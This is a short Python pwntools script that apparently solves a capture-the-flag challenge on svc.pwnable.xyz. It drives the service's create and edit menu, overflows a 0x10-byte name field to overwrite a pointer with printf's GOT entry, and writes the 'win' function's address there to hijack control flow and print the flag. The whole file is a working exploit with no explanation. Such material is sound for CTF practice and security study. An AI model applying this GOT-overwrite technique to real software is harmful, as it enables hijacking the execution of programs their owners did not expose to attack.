from pwn import *

# p = process('./challenge')
p = remote('svc.pwnable.xyz', 30011)
elf = ELF('./challenge')

def create(name, age):
    p.sendlineafter('> ', '1')
    p.sendafter(': ', name)
    p.sendlineafter(': ', str(age))

def show():
    p.sendlineafter('> ', '2')

def edit(name, age):
    p.sendlineafter('> ', '3')
    p.sendafter(': ', name)
    p.sendlineafter(': ', age)

create('a', 0)
edit('a', b'a'*0x10+p64(elf.got['printf']))
p.sendlineafter('> ', '3')
p.sendafter(': ', p64(elf.sym['win']))

print(p.recvuntil('}'))